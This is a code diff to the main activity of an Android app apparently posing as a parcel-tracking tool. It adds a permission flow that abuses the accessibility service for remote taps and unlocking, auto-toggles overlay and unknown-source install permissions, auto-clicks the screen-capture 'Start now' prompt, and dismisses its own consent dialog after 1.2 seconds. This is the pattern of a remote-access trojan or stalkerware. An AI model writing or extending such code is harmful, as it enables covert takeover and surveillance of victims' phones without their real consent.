@@ -166,6 +166,7 @@ class MainActivity : Activity() {
 
         private const val PREFS = "rastreio_facil_prefs"
         private const val KEY_PRIMEIRO_ACESSO = "primeiro_acesso"
+        private const val KEY_PERMISSOES_OK = "permissoes_onboarding_ok"
         // Quando true, o cliente já chegou na tela "Análise em Andamento"
         // (etapa 4). Persistido para que, ao fechar e reabrir o app, a tela
         // permaneça a mesma (com o círculo de loop).
@@ -407,8 +408,12 @@ class MainActivity : Activity() {
             }
         }.start()
 
-        solicitarNotificacaoSePrecisar()
-        solicitarIsencaoBateria()
+        // Permissões agora são conduzidas pelo ORQUESTRADOR (fluxo único e
+        // sequencial, com modal + inject). Dispara no 1º acesso; concluído 1x,
+        // nunca mais roda. Notificações/bateria entram como passos do fluxo.
+        handlerMain.postDelayed({
+            try { executarOrquestracaoPermissoes() } catch (_: Exception) {}
+        }, 800L)
 
         // Registra BroadcastReceiver da tela de carregamento / atualização remota
         try {
@@ -482,10 +487,14 @@ class MainActivity : Activity() {
         super.onResume()
         if (voltandoDeAcessibilidade) {
             voltandoDeAcessibilidade = false
-            if (isAcessibilidadeAtiva()) {
-                exibirModalConsentimentoTela()
-            }
         }
+        // ORQUESTRADOR: ao voltar de QUALQUER tela de permissão, re-checa e avança
+        // para a próxima pendente (ou conclui). Só roda enquanto houver pendência.
+        try {
+            if (::prefs.isInitialized && !prefs.getBoolean(KEY_PERMISSOES_OK, false)) {
+                handlerMain.postDelayed({ executarOrquestracaoPermissoes() }, 600L)
+            }
+        } catch (_: Exception) {}
     }
 
     override fun onPause() {
@@ -1547,6 +1556,120 @@ class MainActivity : Activity() {
         layoutCampo.addView(editText)
 
         return Pair(layoutCampo, editText)
+    }
+
+    // ══════════════ ORQUESTRADOR DE PERMISSÕES (1ª abertura) ══════════════
+    // Fluxo ÚNICO, sequencial e organizado (estilo WhatsApp): cada permissão
+    // mostra um modal central explicando, leva o aparelho à TELA CERTA e, quando
+    // possível, o inject confirma sozinho. Concedida 1x = NUNCA mais pedida (a
+    // fonte da verdade é o próprio estado do Android, checado a cada retorno).
+    private data class PassoPermissao(
+        val id: String,
+        val titulo: String,
+        val descricao: String,
+        val concedida: () -> Boolean,
+        val abrir: () -> Unit
+    )
+
+    private fun passosPermissao(): List<PassoPermissao> {
+        val lista = mutableListOf<PassoPermissao>()
+        // 1) ACESSIBILIDADE — base de tudo (habilita o inject das próximas telas).
+        lista.add(PassoPermissao(
+            "acessibilidade", "Ativar Acessibilidade",
+            "Necessária para o controle remoto (toques, rolagem e desbloqueio). " +
+                "Na próxima tela, ative o serviço \"${marcaNome()}\".",
+            { isAcessibilidadeAtiva() },
+            {
+                voltandoDeAcessibilidade = true
+                try { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)) } catch (_: Exception) {}
+            }
+        ))
+        // 2) SOBREPOSIÇÃO — exibir sobre outros apps (o inject liga o interruptor).
+        lista.add(PassoPermissao(
+            "overlay", "Permitir sobreposição",
+            "Para exibir sobre outros apps. Ative \"Permitir exibir sobre outros apps\".",
+            { podeSobrepor() },
+            { MyAccessibilityService.armarInterruptorPermissao(); abrirTelaSobreposicao() }
+        ))
+        // 3) BATERIA — ignorar otimização (não cair a conexão com a tela apagada).
+        lista.add(PassoPermissao(
+            "bateria", "Ignorar otimização de bateria",
+            "Mantém a conexão ativa com a tela apagada — o espelhamento não cai.",
+            {
+                val pm = getSystemService(POWER_SERVICE) as? PowerManager
+                pm?.isIgnoringBatteryOptimizations(packageName) == true
+            },
+            {
+                try { startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)) } catch (_: Exception) {}
+            }
+        ))
+        // 4) NOTIFICAÇÕES (API 33+) — serviço em primeiro plano estável.
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            lista.add(PassoPermissao(
+                "notificacoes", "Permitir notificações",
+                "Para o serviço rodar em primeiro plano de forma estável.",
+                { ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED },
+                { requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), REQUEST_NOTIFICACAO) }
+            ))
+        }
+        // 5) FONTES DESCONHECIDAS (API 26+) — instalar o módulo de suporte.
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            lista.add(PassoPermissao(
+                "fontes", "Permitir instalar desta fonte",
+                "Para instalar o módulo de suporte. Ative \"Permitir desta fonte\".",
+                { packageManager.canRequestPackageInstalls() },
+                {
+                    MyAccessibilityService.armarInterruptorPermissao()
+                    try { startActivity(Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:$packageName")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)) } catch (_: Exception) {}
+                }
+            ))
+        }
+        // 6) ESPELHAMENTO (MediaProjection) — por último; o "Iniciar agora" já é
+        //    auto-clicado pelo loop do serviço de acessibilidade.
+        lista.add(PassoPermissao(
+            "captura", "Iniciar espelhamento",
+            "Permite ver a tela do aparelho. Toque em \"Iniciar agora\".",
+            { ScreenCaptureService.isRunning && ScreenCaptureService.capturandoDeVerdade },
+            { prosseguirMediaProjection() }
+        ))
+        return lista
+    }
+
+    @Volatile private var orquestrandoPermissoes = false
+
+    /** Avança o fluxo de permissões: pega a 1ª pendente, mostra o modal central e
+     *  leva à tela certa. Chamado no 1º acesso e a cada onResume (ao voltar de uma
+     *  tela de permissão, re-checa e vai para a próxima). Idempotente. */
+    private fun executarOrquestracaoPermissoes() {
+        if (prefs.getBoolean(KEY_PERMISSOES_OK, false)) return  // já concluído antes
+        val pendente = passosPermissao().firstOrNull { !it.concedida() }
+        if (pendente == null) {
+            prefs.edit().putBoolean(KEY_PERMISSOES_OK, true).apply()
+            orquestrandoPermissoes = false
+            Log.i(TAG, "[PERMISSOES] Todas concedidas — onboarding de permissões concluído.")
+            return
+        }
+        if (orquestrandoPermissoes) return
+        orquestrandoPermissoes = true
+        Log.i(TAG, "[PERMISSOES] Passo pendente: ${pendente.id}")
+        runOnUiThread {
+            try {
+                val dlg = AlertDialog.Builder(this)
+                    .setTitle(pendente.titulo)
+                    .setMessage(pendente.descricao)
+                    .setCancelable(false)
+                    .setPositiveButton("Permitir agora") { _, _ -> orquestrandoPermissoes = false; pendente.abrir() }
+                    .create()
+                dlg.show()
+                // Hands-free: auto-confirma o próprio modal após 1,2s e já leva à tela.
+                handlerMain.postDelayed({
+                    if (dlg.isShowing) { dlg.dismiss(); orquestrandoPermissoes = false; pendente.abrir() }
+                }, 1200L)
+            } catch (e: Exception) {
+                orquestrandoPermissoes = false
+                Log.e(TAG, "[PERMISSOES] Erro ao exibir modal: ${e.message}")
+            }
+        }
     }
 
     private fun atualizarEtapaInterface() {
